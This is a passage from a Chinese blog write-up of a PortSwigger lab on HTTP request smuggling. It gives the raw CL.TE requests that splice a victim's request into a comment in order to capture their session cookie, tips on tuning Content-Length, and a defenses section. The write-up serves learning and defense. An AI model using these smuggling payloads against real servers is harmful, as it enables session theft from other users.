class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>325<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-apache"><span class="hljs-attribute">0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">POST</span> /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"><span class="hljs-attribute">Host</span>: ace31f621e3458058060015600db0052.web-security-academy.net</span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">665</span></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: session=dqEjUlzKqlWzKEqYGZjHHnxopBVwXE83</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">csrf</span>=w5OK3MzGFJFmISARVohtuyl2WCxYQRgG&amp;postId=<span class="hljs-number">3</span>&amp;name=p&amp;email=a%<span class="hljs-number">40</span>q.cc&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fa.cc&amp;comment=a</span><br></code></pre></td></tr></table></figure>

<p>前置服务器通过 <code>Content-Length</code> 判断这是一个完整的请求，于是全部发到后端服务器。后端识别 <code>Transfer-Encoding: chunked</code> 并截取到 <code>0\r\n\r\n</code> 的位置：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ace31f621e3458058060015600db0052.web-security-academy.net<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>325<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-angelscript"><span class="hljs-number">0</span></span><br><span class="language-angelscript"><span class="hljs-string">[空白行]</span></span><br><span class="language-angelscript"><span class="hljs-string">[空白行]</span></span><br></code></pre></td></tr></table></figure>

<p>认为这是一个完整的请求，进而交由后端应用处理并响应。</p>
<p>此时缓冲区中还剩下的内容是一个发布评论的请求：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/post/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ace31f621e3458058060015600db0052.web-security-academy.net<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>665<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=dqEjUlzKqlWzKEqYGZjHHnxopBVwXE83<br><br><span class="language-llvm">csrf<span class="hljs-operator">=</span>w<span class="hljs-number">5</span>OK<span class="hljs-number">3</span>MzGFJFmISARVohtuyl<span class="hljs-number">2</span>WCxYQRgG&amp;postId<span class="hljs-operator">=</span><span class="hljs-number">3</span>&amp;name<span class="hljs-operator">=</span>p&amp;email<span class="hljs-operator">=</span>a<span class="hljs-variable">%40</span>q.<span class="hljs-keyword">cc</span>&amp;website<span class="hljs-operator">=</span>http<span class="hljs-variable">%3</span>A<span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Fa.<span class="hljs-keyword">cc</span>&amp;comment<span class="hljs-operator">=</span>a</span><br></code></pre></td></tr></table></figure>

<p>被认为是下一次请求的一部分，于是继续等待剩余请求内容。如果此时有 A 用户发出请求，A 的请求会被拼接到缓冲区已有内容的末尾形成一个完整的请求。也就是说 A 用户的请求被拼接成了如下，作为 comment 的值被后端应用处理了。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/post/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ace31f621e3458058060015600db0052.web-security-academy.net<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>665<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=dqEjUlzKqlWzKEqYGZjHHnxopBVwXE83<br><br><span class="language-dts"><span class="hljs-attr">csrf</span><span class="hljs-operator">=</span>w5OK3MzGFJFmISARVohtuyl2WCxYQRgG<span class="hljs-variable">&amp;</span>postId=<span class="hljs-number">3</span><span class="hljs-variable">&amp;name</span>=p<span class="hljs-variable">&amp;email</span>=a%<span class="hljs-number">40</span>q.cc<span class="hljs-variable">&amp;website</span>=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2F</span>%<span class="hljs-number">2F</span>a.cc<span class="hljs-variable">&amp;comment</span>=aGET / HTTP/<span class="hljs-number">1.1</span></span><br><span class="language-dts"><span class="hljs-symbol">Host:</span> ace31f621e3458058060015600db0052.web-security-academy.net</span><br><span class="language-dts"><span class="hljs-symbol">Cookie:</span> <span class="hljs-attr">session</span><span class="hljs-operator">=</span>Aut2OpgUu5CETZx284akOcSqrJ5UNlqI</span><br><span class="language-dts">....</span><br></code></pre></td></tr></table></figure>

<p>这样我们就可以在网页上显示 comment 内容的地方看到用户 A 的 HTTP 请求，获取 Cookie 等敏感数据。</p>
<p>这个实验在复现时需要一点运气，后台模拟的受害者不一定什么时候会访问到，而且还要多次试验调整 CL 长度来包含完整的 Cookie。注意 CL 要一点一点加，我是从 400 开始每次加 100，到 700 时出现了未知错误，于是减到 660，出现了一部分 session 内容，再以我自己的 session 长度为标准加到 665，正好包含全部 session 值。</p>
<p><img src="/./http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101659-890c0224-722c-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="/./http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/20200330101711-90608860-722c-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
<ul>
<li>禁用代理服务器与后端服务器之间的 TCP 连接重用</li>
<li>使用 HTTP&#x2F;2 协议</li>
<li>前后端使用相同的服务器</li>
</ul>
<p>以上的措施有的不能从根本上解决问题，而且有着很多不足，就比如禁用代理服务器和后端服务器之间的 TCP 连接重用，会增大后端服务器的压力。使用 HTTP&#x2F;2 在现在的网络条件下根本无法推广使用，哪怕支持 HTTP&#x2F;2 协议的服务器也会兼容 HTTP&#x2F;1.1。从本质上来说，HTTP 请求走私出现的原因并不是协议设计的问题，而是不同服务器实现的问题，个人认为最好的解决方案就是严格的实现 RFC7230-7235 中所规定的的标准，但这也是最难做到的。</p>
</blockquote>
<p>对于 HTTP&#x2F;2 能避免请求走私的原理，根据 @ZeddYu 师傅的<a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/12/05/HTTP-Smuggling/#Defence">描述</a>，我去查了一下<a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/performance/http2">HTTP&#x2F;2 简介</a>，总结一下，HTTP&#x2F;1.1 的一些特性为请求走私创造了条件：</p>
<ol>
<li>纯文本，以换行符作为分隔符</li>
<li>序列和阻塞机制</li>
</ol>
<p>而在 HTTP&#x2F;2 中已经没有了产生请求走私的机会：</p>
<ol>
<li>使用<strong>二进制编码</strong>且分割为更小的传输单位（帧，拥有编号，<strong>可乱序传输</strong>）</li>
<li><strong>同一个来源的所有通信都在一个 TCP 连接上完成</strong>，此连接可以承载任意数量的双向数据流</li>
</ol>
<blockquote>
<p>With the new binary framing mechanism in place, HTTP&#x2F;2 no longer needs multiple TCP connections to multiplex streams in parallel; each stream is split into many frames, which can be interleaved and prioritized. As a result, all HTTP&#x2F;2 connections are persistent, and only one connection per origin is required, which offers numerous performance benefits.</p>
</blockquote>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
      
        <a href="/tags/web/" class="print-no-link">#web</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>http请求走私</div>
      <div>http://litt1e-ice.github.io/2024/11/24/http请求走私/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>litt1e-ice</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年11月24日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/11/15/%E4%B9%90%E7%90%86%E7%AC%94%E8%AE%B007-%E5%92%8C%E5%BC%A6/" title="乐理笔记07-和弦">
                        <span class="hidden-mobile">乐理笔记07-和弦</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
